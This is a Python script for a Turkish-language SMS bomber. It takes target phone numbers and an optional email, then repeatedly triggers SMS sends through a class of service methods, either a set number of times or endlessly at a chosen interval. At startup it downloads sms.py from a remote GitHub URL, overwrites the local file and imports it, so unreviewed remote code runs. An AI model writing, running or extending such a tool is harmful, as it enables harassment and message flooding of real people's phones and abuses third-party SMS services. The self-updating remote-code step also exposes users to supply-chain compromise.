from colorama import Fore, Style
from time import sleep
from os import system
from requests import get
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
r = get("https://raw.githubusercontent.com/OhirLex/BtcTurk-SmsBomber/patch-1/sms.py").text
with open("sms.py", "r", encoding="utf-8") as f:
    read = f.read()
if read == r:
    pass
else:
    print(Fore.RED + "Güncelleme yapılıyor...")
    with open("sms.py", "w", encoding="utf-8") as f:
        f.write(r)
from sms import SendSms
servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)    
while 1:
    system("cls||clear")
    print("""{}
  
▀▀▀▀▀▀▀▀▀▀▀▀▀▀
▀ ▀
▀ B T C - B O M B ▀
▀ ▀
▀▀▀▀▀▀▀▀▀▀▀▀▀▀          

    Sms: {}                                      
    """.format(Fore.LIGHTRED_EX, len(servisler_sms), Style.RESET_ALL, Fore.CYAN))
    print(Fore.LIGHTGREEN_EX+"{/} "+Style.RESET_ALL+"Katkıda bulunanlar: "+Fore.LIGHTGREEN_EX+Style.BRIGHT+"edited by ICARDI, Yıldırım\n"+Style.RESET_ALL)
    try:
        menu = int(input(Fore.LIGHTMAGENTA_EX + " 1- SMS Gönder\n 2- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (birden çoksa 'enter' bas): "+ Fore.LIGHTGREEN_EX, end="")
            tel_no = input()
            if tel_no != "" and len(str(tel_no)) == 10:
                tel_no2 = "bos"
                tel_no3 = "bos"
                tel_no4 = "bos"
                tel_no5 = "bos"
            if tel_no == "":
                system("cls||clear")
                print( Fore.LIGHTGREEN_EX+"[+] "+Fore.CYAN+"TXT dosya formatı:\n"
                      +Fore.LIGHTGREEN_EX+"[+] "+Fore.CYAN+"En fazla 5 numara olacak şekilde başında '+90' olmadan alt alta numaraları yazın.")
                print("")
                print("")
                print(Fore.LIGHTYELLOW_EX + "TXT dosyasının yolunu giriniz: "+ Fore.LIGHTGREEN_EX, end="")
                dosya_yolu = input()
                try:
                    with open(dosya_yolu, 'r') as file:
                        tel_list = file.readlines()
                        for i, number in enumerate(tel_list):
                            if i == 0:
                                tel_no = number.strip()
                            elif i == 1:
                                tel_no2 = number.strip()
                            elif i == 2:
                                tel_no3 = number.strip()
                            elif i == 3:
                                tel_no4 = number.strip()
                            elif i == 4:
                                tel_no5 = number.strip()
                            elif i == 5:
                                tel_no6 = number.strip()
                            elif i == 6:
                                tel_no7 = number.strip()
                            elif i == 7:
                                tel_no8 = number.strip()
                            elif i == 8:
                                tel_no9 = number.strip()
                            elif i == 9:
                                tel_no10 = number.strip()
                            elif i == 10:
                                tel_no11 = number.strip()
                            elif i == 11:
                                tel_no12 = number.strip()
                            elif i == 12:
                                tel_no13 = number.strip()
                            elif i == 13:
                                tel_no14 = number.strip()
                            elif i == 14:
                                tel_no15 = number.strip()
                            elif i == 15:
                                tel_no16 = number.strip()
                            elif i == 16:
                                tel_no17 = number.strip()
                            elif i == 17:
                                tel_no18 = number.strip()
                            elif i == 18:
                                tel_no19 = number.strip()
                            elif i ==19:
                                tel_no20 = number.strip()
                            elif i == 20:
                                tel_no21 = number.strip()
                            elif i == 21:
                                tel_no22 = number.strip()
                            elif i == 22:
                                tel_no23 = number.strip()
                            elif i == 23:
                                tel_no24 = number.strip()
                            elif i == 24:
                                tel_no25 = number.strip()
                            elif i == 25:
                                tel_no26 = number.strip()
                            elif i == 26:
                                tel_no27 = number.strip()
                            elif i == 27:
                                tel_no28 = number.strip()
                            elif i == 28:
                                tel_no29 = number.strip()
                            elif i == 29:
                                tel_no30 = number.strip()
                            elif i == 30:
                                tel_no31 = number.strip()
                            elif i == 31:
                                tel_no32 = number.strip()
                            elif i == 32:
                                tel_no33 = number.strip()
                            elif i == 33:
                                tel_no34 = number.strip()
                            elif i == 34:
                                tel_no35 = number.strip()
                            elif i == 35:
                                tel_no36 = number.strip()
                            elif i == 36:
                                tel_no37 = number.strip()
                            elif i == 37:
                                tel_no38 = number.strip()
                            elif i == 38:
                                tel_no39 = number.strip()
                            elif i == 39:
                                tel_no40 = number.strip()
                            elif i == 40:
                                tel_no41 = number.strip()
                            elif i == 41:
                                tel_no42 = number.strip()
                            elif i == 42:
                                tel_no43 = number.strip()
                            if len(number.strip()) != 10:
                                raise ValueError
                        if i<6:
                            for j in range(i+1,7):
                                if j==1:
                                    tel_no2 = "bos"
                                elif j==2:
                                    tel_no3 = "bos"
                                elif j==3:
                                    tel_no4 = "bos"
                                elif j==4:
                                    tel_no5 = "bos"
                                elif j==5:
                                    tel_no6 = "bos"
                                elif j==6:
                                    tel_no7 = "bos"
                                elif j==7:
                                    tel_no8 = "bos"
                                elif j==8:
                                    tel_no9 = "bos"
                                elif j==9:
                                    tel_no10 = "bos"
                                elif j==10:
                                    tel_no11 = "bos"
                                elif j==11:
                                    tel_no12 = "bos"
                                elif j==12:
                                    tel_no13 = "bos"
                                elif j==13:
                                    tel_no14 = "bos"
                                elif j==14:
                                    tel_no15 = "bos"
                                elif j==15:
                                    tel_no16 = "bos"
                                elif j==16:
                                    tel_no17 = "bos"
                                elif j==17:
                                    tel_no18 = "bos"
                                elif j==18:
                                    tel_no19 = "bos"
                                elif j==19:
                                    tel_no20 = "bos"
                                elif j==20:
                                    tel_no21 = "bos"
                                elif j==21:
                                    tel_no22 = "bos"
                                elif j==22:
                                    tel_no23 = "bos"
                                elif j==23:
                                    tel_no24 = "bos"
                                elif j==24:
                                    tel_no25 = "bos"
                                elif j==25:
                                    tel_no26 = "bos"
                                elif j==26:
                                    tel_no27 = "bos"
                                elif j==27:
                                    tel_no28 = "bos"
                                elif j==28:
                                    tel_no29 = "bos"
                                elif j==29:
                                    tel_no30 = "bos"
                                elif j==30:
                                    tel_no31 = "bos"
                                elif j==31:
                                    tel_no32 = "bos"
                                elif j==32:
                                    tel_no33 = "bos"
                                elif j==33:
                                    tel_no34 = "bos"
                                elif j==34:
                                    tel_no35 = "bos"
                                elif j==35:
                                    tel_no36 = "bos"
                                elif j==36:
                                    tel_no37 = "bos"
                                elif j==37:
                                    tel_no38 = "bos"
                                elif j==38:
                                    tel_no39 = "bos"
                                elif j==39:
                                    tel_no40 = "bos"
                                elif j==40:
                                    tel_no41 = "bos"
                                elif j==41:
                                    tel_no42 = "bos"
                                elif j==42:
                                    tel_no43 = "bos"
                except FileNotFoundError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Dosya bulunamadı. Tekrar deneyiniz.")
                    sleep(3)
                    continue
                except ValueError:
                    system("cls||clear")
                    print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.")
                    sleep(3)
                    continue
            else:
                if len(tel_no) != 10:
                  raise ValueError
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+ Fore.LIGHTGREEN_EX, end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            print(Fore.LIGHTGREEN_EX+"[+] "+Fore.CYAN+"Birden çok numara varsa her bir numara için.")
            print(Fore.LIGHTYELLOW_EX + "Kaç adet SMS göndermek istiyorsun (sonsuz ise 'enter' bas): "+ Fore.LIGHTGREEN_EX, end="")  
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Tekrar deneyiniz.") 
            sleep(3)
            continue

        system("cls||clear")
        try:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: "+ Fore.LIGHTGREEN_EX, end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "Hatalı giriş yaptınız. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is not None:
             tel_numbers = [tel_no, tel_no2, tel_no3, tel_no4, tel_no5]
             bos_olmayan = len([x for x in tel_numbers if x != "bos"])
             keree = kere * bos_olmayan
        sms = SendSms(tel_no, tel_no2, tel_no3, tel_no4, tel_no5, mail)
        if isinstance(kere, int):
                  while sms.adet < kere:
                      for attribute in dir(SendSms):
                          attribute_value = getattr(SendSms, attribute)
                          if callable(attribute_value):
                              if attribute.startswith('__') == False:
                                  if sms.adet == keree or sms.adet > keree:
                                      break
                                  exec("sms."+attribute+"()")
                                  sleep(aralik)
                  print(Fore.LIGHTRED_EX + "\nMenüye dönmek için 'enter' tuşuna basınız..")
                  input()
        elif kere is None: 
                  while True:
                      for attribute in dir(SendSms):
                          attribute_value = getattr(SendSms, attribute)
                          if callable(attribute_value):
                              if attribute.startswith('__') == False:
                               exec("sms."+attribute+"()")
                               sleep(aralik)
    elif menu == 2:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
